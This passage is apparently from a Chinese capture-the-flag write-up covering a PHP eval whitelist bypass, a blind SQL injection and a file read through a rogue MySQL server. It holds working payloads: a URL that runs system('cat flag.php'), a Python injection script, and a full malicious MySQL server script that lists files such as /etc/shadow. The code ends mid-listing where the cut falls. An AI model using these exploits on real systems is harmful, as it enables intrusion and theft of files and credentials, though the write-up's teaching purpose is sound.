&apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;]; </span><br><span class="line">    preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123; </span><br><span class="line">        if (!in_array($func, $whitelist)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //帮你算出答案 </span><br><span class="line">    eval(&apos;echo &apos;.$content.&apos;;&apos;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>其中对输入长度和特殊字符进行了过滤，并以白名单的方式限制<code>eval()</code>执行的函数为列表中的数学函数。其中有一个函数为<code>base_convert()</code>能够实现不同进制的转换，我们设想可以通过他来实现从字符串到数字的转换（字符串组成基本上是英文字母，而26个英文字母加上10个数字可以认为是36进制）。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="string">"ls"</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">// 784，即36进制的"ls"转化为10进制为数字784</span></span><br><span class="line">base_convert(<span class="number">784</span>,<span class="number">10</span>,<span class="number">36</span>);</span><br><span class="line"><span class="comment">// 通过这种方式还原"ls"</span></span><br></pre></td></tr></table></figure></p>
<p>通过上述方法执行<code>ls</code>命令后得知目录下存在<code>flag.php</code>文件，我们的任务也就是读取其中的内容了。但是原本的<code>base_convert()</code>方法无法逾越字数限制，于是考虑构造<code>$_GET()</code>函数，从而引入另一个参数，绕过长度限制。那么如何构造<code>_</code>呢？通过查ASCII表，<code>_</code>的十六进制为<code>5f</code>，那么<code>hex2bin(“5f”)</code>就代表二进制字符串<code>_</code>，然后用<code>base_convert(37907361743,10,36)</code>构造hex2bin()函数。<br>通过变量替换：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324)); </span><br><span class="line">// 即：$pi = _GET;</span><br></pre></td></tr></table></figure></p>
<p>构造请求，增加接收参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">($$pi)&#123;1&#125;(($$pi)&#123;2&#125;) </span><br><span class="line">// 即：($_GET)&#123;1&#125;(($_GET))&#123;2&#125;;</span><br></pre></td></tr></table></figure></p>
<p>发送参数，查看flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;1=system&amp;2=cat%20flag.php</span><br></pre></td></tr></table></figure></p>
<p>最终payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target_url/calc.php?c=$pi%3Dbase_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=cat%20flag.php</span><br></pre></td></tr></table></figure></p>
<h2 id="0x02-Web-全宇宙最简单的SQL"><a href="#0x02-Web-全宇宙最简单的SQL" class="headerlink" title="0x02 Web - 全宇宙最简单的SQL"></a>0x02 Web - 全宇宙最简单的SQL</h2><blockquote>
<p>参考<a href="https://www.zhaoj.in/read-5417.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5417.html</a></p>
</blockquote>
<p>页面主要接收<code>username</code>和<code>password</code>两个输入，经过测试，可以确认以下几点：  </p>
<ol>
<li><code>username</code>存在注入点。  </li>
<li><code>or</code>被替换为<code>QwQ</code>.  </li>
<li>拼接语句执行无误时无论如何均返回“登录失败”。  </li>
<li>当拼接语句执行失败时返回“数据库操作失败”。  </li>
</ol>
<p>故推断题目为布尔型盲注。<br>经过测试，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = admin&apos; union select cot(1 and left(database(),1)&gt;&apos;a&apos;);#</span><br></pre></td></tr></table></figure></p>
<p>即当`left(database(),1)&gt;’a’为真时，整个表达式大于0，没有错误产生；当条件为假时，表达式等于0，产生错误。<br>利用脚本Fuzz：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_all_databases(<span class="string">"http://39.97.167.120:52105/"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    result = requests.post(url, data=&#123;<span class="string">'username'</span>: <span class="string">'admin'</span> + payload, <span class="string">'password'</span>: <span class="string">'123456'</span>&#125;)</span><br><span class="line">    result.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="keyword">if</span> result.text.find(<span class="string">'数据库操作失败'</span>) == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_databases</span><span class="params">(url)</span>:</span></span><br><span class="line">    db_nums_payload = <span class="string">"select count(*) from users"</span></span><br><span class="line">    db_numbers = half(url, db_nums_payload)</span><br><span class="line">    print(<span class="string">"长度为：%d"</span> % db_numbers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 二分法函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"' union select cot(1 and (%s) &gt; %d);#"</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(url, mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>后面类比，读取<code>user</code>表内容，测出<code>username=admin</code>，<code>password=F1AG@1s-at_/fll1llag_h3r3</code>，似乎提示flag的位置。用上述用户名密码可以正常登录。进入了一个可以执行sql的页面。运行恶意mysql服务器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> asyncore</span><br><span class="line"><span class="keyword">import</span> asynchat</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.handlers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">log = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line">log.setLevel(logging.DEBUG)</span><br><span class="line"><span class="comment"># tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')</span></span><br><span class="line">tmp_format = logging.StreamHandler()</span><br><span class="line">tmp_format.setFormatter(logging.Formatter(<span class="string">"%(asctime)s:%(levelname)s:%(message)s"</span>))</span><br><span class="line">log.addHandler(</span><br><span class="line">    tmp_format</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">filelist = (</span><br><span class="line"><span class="comment">#    r'c:\boot.ini',</span></span><br><span class="line"><span class="comment">#    r'c:\windows\win.ini',</span></span><br><span class="line"><span class="comment">#    r'c:\windows\system32\drivers\etc\hosts',</span></span><br><span class="line">    <span class="string">'/fll1llag_h3r3'</span>,</span><br><span class="line"><span class="comment">#    '/etc/shadow',</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"><span class="comment">#=======No need to change after this lines=======</span></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Gifts'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">daemonize</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os, warnings</span><br><span class="line">    <span class="keyword">if</span> os.name != <span class="string">'posix'</span>:</span><br><span class="line">        warnings.warn(<span class="string">'Cant create daemon on non-posix system'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.setsid()</span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.umask(<span class="number">0o022</span>)</span><br><span class="line">    null=os.open(<span class="string">'/dev/null'</span>, os.O_RDWR)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.dup2(null, i)</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.errno != <span class="number">9</span>: <span class="keyword">raise</span></span><br><span class="line">    os.close(null)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LastPacket</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutOfOrder</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_packet</span><span class="params">(object)</span>:</span></span><br><span class="line">    packet_header = struct.Struct(<span class="string">'&lt;Hbb'</span>)</span><br><span class="line">    packet_header_long = struct.Struct(<span class="string">'&lt;Hbbb'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, packet_type, payload)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(packet_type, mysql_packet):</span><br><span class="line">            self.packet_num = packet_type.packet_num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.packet_num = packet_type</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        payload_len = len(self.payload)</span><br><span class="line">        <span class="keyword">if</span> payload_len &lt; <span class="number">65536</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len, <span class="number">0</span>, self.packet_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len &amp; <span class="number">0xFFFF</span>, payload_len &gt;&gt; <span class="number">16</span>, <span class="number">0</span>, self.packet_num)</span><br><span class="line"></span><br><span class="line">        result = <span class="string">"&#123;0&#125;&#123;1&#125;"</span>.format(</span><br><span class="line">            header,</span><br><span class="line">            self.payload</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> repr(str(self))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(raw_data)</span>:</span></span><br><span class="line">        packet_num = ord(raw_data[<span class="number">0</span>])</span><br><span class="line">        payload = raw_data[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mysql_packet(packet_num, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">http_request_handler</span><span class="params">(asynchat.async_chat)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        asynchat.async_chat.__init__(self, sock=addr[<span class="number">0</span>])</span><br><span class="line">        self.addr = addr[<span class="number">1</span>]</span><br><span class="line">        self.ibuffer = []</span><br><span class="line">        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">        self.state = <span class="string">'LEN'</span></span><br><span class="line">        self.sub_state = <span class="string">'Auth'</span></span><br><span class="line">        self.logined = <span class="keyword">False</span></span><br><span class="line">        self.push(</span><br><span class="line">            mysql_packet(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="string">""</span>.join((</span><br><span class="line">                    <span class="string">'\x0a'</span>,  <span class="comment"># Protocol</span></span><br><span class="line">                    <span class="string">'5.6.28-0ubuntu0.14.04.1'</span> + <span class="string">'\0'</span>,</span><br><span class="line">                    <span class="string">'\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00'</span>,</span><br><span class="line">                ))            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.order = <span class="number">1</span></span><br><span class="line">        self.states = [<span class="string">'LOGIN'</span>, <span class="string">'CAPS'</span>, <span class="string">'ANY'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Pushed: %r'</span>, data)</span><br><span class="line">        data = str(data)</span><br><span class="line">        asynchat.async_chat.push(self, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">collect_incoming_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Data recved: %r'</span>, data)</span><br><span class="line">        self.ibuffer.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">found_terminator</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = <span class="string">""</span>.join(self.ibuffer)</span><br><span class="line">        self.ibuffer = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'LEN'</span>:</span><br><span class="line">            len_bytes = ord(data[<span class="number">0</span>]) + <span class="number">256</span>*ord(data[<span class="number">1</span>]) + <span class="number">65536</span>*ord(data[<span class="number">2</span>]) + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> len_bytes &lt; <span class="number">65536</span>:</span><br><span class="line">                self.set_terminator(len_bytes)</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'MoreLength'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'MoreLength'</span>:</span><br><span class="line">            <span class="keyword">if</span> data[<span class="number">0</span>] != <span class="string">'\0'</span>:</span><br><span class="line">                self.push(<span class="keyword">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'Data'</span>:</span><br><span class="line">            packet = mysql_packet.parse(data)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> self.order != packet.packet_num:</span><br><span class="line">                    <span class="keyword">raise</span> OutOfOrder()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># Fix ?</span></span><br><span class="line">                    self.order = packet.packet_num + <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> packet.packet_num == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x03'</span>:</span><br><span class="line">                        log.info(<span class="string">'Query'</span>)</span><br><span class="line"></span><br><span class="line">                        filename = random.choice(filelist)</span><br><span class="line">                        PACKET = mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xFB&#123;0&#125;'</span>.format(filename)</span><br><span class="line">                        )</span><br><span class="line">                        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                        self.state = <span class="string">'LEN'</span></span><br><span class="line">                        self.sub_state = <span class="string">'File'</span></span><br><span class="line">                        self.push(PACKET)</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x1b'</span>:</span><br><span class="line">                        log.info(<span class="string">'SelectDB'</span>)</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xfe\x00\x00\x02\x00'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'\x02'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload == <span class="string">'\x00\x01'</span>:</span><br><span class="line">                        self.push(<span class="keyword">None</span>)</span><br><span class="line">                        self.close_when_done()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.sub_state == <span class="string">'File'</span>:</span><br><span class="line">                        log.info(<span class="string">'-- result'</span>)</span><br><span class="line">                        log.info(<span class="string">'Result: %r'</span>, data)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> len(data) == <span class="number">1</span>:</span><br><span class="line">                            self.push(</span><br><span class="line">                                mysql_packet(packet, <span class="string">'\0\0\0\x02\0\0\0'</span>)</span><br><span class="line">                            )</span><br><span class="line">                            <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                            self.state = <span class="string">'LEN'</span></span><br><span class="line">                            self.order = packet.packet_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> self.sub_state == <span class="string">'Auth'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        log.info(<span class="string">'-- else'</span>)</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">'Unknown packet'</span>)</span><br><span class="line">            <span class="keyword">except</span> LastPacket:</span><br><span class="line">                log.info(<span class="string">'Last packet'</span>)</span><br><span class="line">                self.state = <span class="string">'LEN'</span></span><br><span class="line">                self.sub_state = <span class="keyword">None</span></span><br><span class="line">                self.order = <span class="number">0</span></span><br><span class="line">                self.set_terminator(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> OutOfOrder:</span><br><span class="line">                log.warning(<span class="string">'Out of order'</span>)</span><br><span class="line">                self.push(<span class="keyword">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.error(<span class="string">'Unknown state'</span>)</span><br><span class="line">            self.push(<span class="string">'None'</span>)</span><br><span class="line">            self.close_when_done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_listener</span><span class="params">(asyncore.dispatcher)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, sock=None)</span>:</span></span><br><span class="line">        asyncore.dispatcher.__init__(self, sock)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            self.set_reuse_addr()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.bind((<span class="string">''</span>, PORT))</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            self.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span><span class="params">(self)</span>:</span></span><br><span class="line">        pair = self.accept()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pair <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            log.info(<span class="string">'Conn from: %r'</span>, pair[<span class="number">1</span>])</span><br><span class="line">  